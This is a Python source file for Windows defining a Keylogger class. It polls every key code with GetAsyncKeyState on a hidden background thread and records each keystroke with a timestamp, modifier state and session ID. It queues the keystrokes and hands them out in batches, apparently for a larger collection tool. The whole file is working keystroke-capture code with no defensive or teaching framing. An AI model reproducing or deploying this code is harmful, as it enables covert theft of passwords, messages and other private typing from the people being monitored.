# -*- coding: utf-8 -*-
import win32api
import win32con
import time
import threading
from datetime import datetime
from queue import Queue
import logging
from config import Config

class Keylogger:
    def __init__(self):
        self.running = False
        self.queue = Queue()
        self.session_id = Config.SESSION_ID
        self.key_count = 0
        self.shift_pressed = False
        self.caps_lock = False
        self.logger = logging.getLogger(__name__)
        
        # Complete virtual key code mapping
        self.key_map = {
            # Numbers
            0x30: '0', 0x31: '1', 0x32: '2', 0x33: '3', 0x34: '4',
            0x35: '5', 0x36: '6', 0x37: '7', 0x38: '8', 0x39: '9',
            # Letters
            0x41: 'a', 0x42: 'b', 0x43: 'c', 0x44: 'd', 0x45: 'e',
            0x46: 'f', 0x47: 'g', 0x48: 'h', 0x49: 'i', 0x4A: 'j',
            0x4B: 'k', 0x4C: 'l', 0x4D: 'm', 0x4E: 'n', 0x4F: 'o',
            0x50: 'p', 0x51: 'q', 0x52: 'r', 0x53: 's', 0x54: 't',
            0x55: 'u', 0x56: 'v', 0x57: 'w', 0x58: 'x', 0x59: 'y',
            0x5A: 'z',
            # Symbols
            0xBA: ';', 0xBB: '=', 0xBC: ',', 0xBD: '-', 0xBE: '.',
            0xBF: '/', 0xC0: '`', 0xDB: '[', 0xDC: '\\', 0xDD: ']',
            0xDE: "'",
            # Special keys
            0x08: '[BACKSPACE]', 0x09: '[TAB]', 0x0D: '[ENTER]',
            0x10: '[SHIFT]', 0x11: '[CTRL]', 0x12: '[ALT]',
            0x14: '[CAPS LOCK]', 0x1B: '[ESC]', 0x20: '[SPACE]',
            0x25: '[LEFT]', 0x26: '[UP]', 0x27: '[RIGHT]', 0x28: '[DOWN]',
            0x2E: '[DELETE]', 0x2C: '[PRINT SCREEN]',
            0x90: '[NUM LOCK]', 0x91: '[SCROLL LOCK]',
            0x70: '[F1]', 0x71: '[F2]', 0x72: '[F3]', 0x73: '[F4]',
            0x74: '[F5]', 0x75: '[F6]', 0x76: '[F7]', 0x77: '[F8]',
            0x78: '[F9]', 0x79: '[F10]', 0x7A: '[F11]', 0x7B: '[F12]'
        }
        
        # Shift symbol mapping
        self.shift_map = {
            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
            '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
            ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
            '`': '~'
        }
        
        self.logger.info('[*] Keylogger initialized')
    
    def start(self):
        if self.running:
            return
        self.running = True
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
        self.logger.info('[OK] Keylogger started')
    
    def stop(self):
        self.running = False
        self.logger.info('[OK] Keylogger stopped')
    
    def _capture_loop(self):
        """Main capture loop"""
        while self.running:
            # Update modifier states
            self.shift_pressed = bool(win32api.GetAsyncKeyState(0x10) & 0x8000)
            self.caps_lock = bool(win32api.GetAsyncKeyState(0x14) & 0x1)
            
            # Check all keys
            for key_code in range(8, 256):
                if self.running and win32api.GetAsyncKeyState(key_code) & 0x1:
                    self._process_key(key_code)
            
            time.sleep(0.005)  # Short delay for CPU efficiency
    
    def _process_key(self, key_code):
        """Process a single keystroke"""
        
        # Skip modifier keys when pressed alone (they trigger separately)
        if key_code in [0x10, 0x11, 0x12, 0x14]:
            key_name = self.key_map.get(key_code, f'[{key_code}]')
        else:
            key_name = self.key_map.get(key_code)
            
            if key_name is None:
                # Try Windows API as fallback
                try:
                    key_name = win32api.GetKeyNameText(key_code)
                    if not key_name:
                        return
                except:
                    return
            
            # Handle case for letters
            if key_name.isalpha():
                if self.shift_pressed or self.caps_lock:
                    key_name = key_name.upper()
                else:
                    key_name = key_name.lower()
            elif self.shift_pressed and key_name in self.shift_map:
                key_name = self.shift_map[key_name]
        
        # Create keystroke object
        keystroke = {
            'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3],
            'key': key_name,
            'key_code': hex(key_code),
            'shift': self.shift_pressed,
            'caps_lock': self.caps_lock,
            'session_id': self.session_id
        }
        
        self.queue.put(keystroke)
        self.key_count += 1
        
        # Debug output (comment out for production)
        self.logger.debug(f"Key: {key_name} | Code: {hex(key_code)}")
    
    def get_keystroke(self, timeout=1):
        """Get a keystroke from the queue"""
        try:
            return self.queue.get(timeout=timeout)
        except:
            return None
    
    def get_batch(self, max_items=100):
        """Get a batch of keystrokes"""
        batch = []
        while len(batch) < max_items and not self.queue.empty():
            try:
                item = self.queue.get_nowait()
                batch.append(item)
            except:
                break
        return batch
    
    def get_stats(self):
        """Get keylogger statistics"""
        return {
            'total_keystrokes': self.key_count,
            'queue_size': self.queue.qsize(),
            'running': self.running,
            'session_id': self.session_id
        }